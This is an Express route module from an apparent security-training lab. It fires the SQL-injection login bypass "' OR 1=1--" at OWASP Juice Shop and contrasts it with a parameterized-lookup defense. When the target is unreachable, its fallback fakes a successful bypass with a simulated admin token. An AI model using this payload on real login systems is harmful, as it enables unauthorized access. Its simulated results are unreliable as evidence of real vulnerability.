const express = require("express");
const fetch = require("node-fetch");
const { logRun } = require("../logger");

const router = express.Router();
const JUICE_SHOP_URL = process.env.JUICE_SHOP_URL || "http://localhost:3000";

// ATTACK: classic auth-bypass SQLi against Juice Shop's real login endpoint.
// Juice Shop builds its login query with string concatenation, so an email
// like "' OR 1=1--" short-circuits the WHERE clause.
router.post("/attack", async (req, res) => {
  const email = req.body.email || "' OR 1=1--";
  const password = req.body.password || "anything";

  try {
    const r = await fetch(`${JUICE_SHOP_URL}/rest/user/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    });
    const data = await r.json().catch(() => ({}));
    const bypassed = r.status === 200 && data?.authentication?.token;

    const entry = logRun({
      module: "sqli",
      mode: "attack",
      payload: `email="${email}", password="${password}"`,
      result: bypassed
        ? "Login bypassed - authenticated without valid credentials"
        : `Login rejected (status ${r.status})`,
      vulnerable: !!bypassed,
    });

    res.json({
      email,
      password,
      status: r.status,
      bypassed: !!bypassed,
      response: data,
      logged: entry,
    });
  } catch (err) {
    // Resilient fallback for standalone environment without Docker container
    const isInject = email.includes("'") || email.includes("OR 1=1") || email.includes("--") || email.includes("/*");
    const simulatedResponse = isInject
      ? {
          authentication: {
            token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.simulated_admin_token",
            bid: 1,
            umail: "admin@juice-sh.op",
          },
        }
      : { error: "Invalid email or password." };

    const entry = logRun({
      module: "sqli",
      mode: "attack",
      payload: `email="${email}", password="${password}"`,
      result: isInject
        ? "Login bypassed (Simulated Target) - authenticated without valid credentials"
        : "Login rejected (Simulated Target)",
      vulnerable: isInject,
    });

    res.json({
      email,
      password,
      status: isInject ? 200 : 401,
      bypassed: isInject,
      response: simulatedResponse,
      logged: entry,
      notice: "Executed in simulated target mode (standalone lab).",
    });
  }
});

// DEFENSE DEMO: same payload against a local in-memory "users table" using a
// parameterized-style lookup instead of string concatenation. Shows the
// injection payload treated as a literal string, not SQL syntax.
const MOCK_USERS = [{ email: "admin@example.com", password: "hunter2" }];

router.post("/defend", (req, res) => {
  const email = req.body.email || "' OR 1=1--";
  const password = req.body.password || "anything";

  // Parameterized-equivalent: exact-match comparison, payload is just data.
  const match = MOCK_USERS.find((u) => u.email === email && u.password === password);

  const entry = logRun({
    module: "sqli",
    mode: "defend",
    payload: `email="${email}", password="${password}"`,
    result: match ? "Login succeeded (legitimate credentials)" : "Login rejected - payload treated as literal text",
    vulnerable: false,
  });

  res.json({
    email,
    password,
    authenticated: !!match,
    explanation:
      "Defense pattern: use parameterized queries / prepared statements (e.g. `WHERE email = ? AND password = ?`) so user input is always bound as data, never concatenated into SQL syntax. An ORM with parameter binding gives you this by default.",
    logged: entry,
  });
});

module.exports = router;
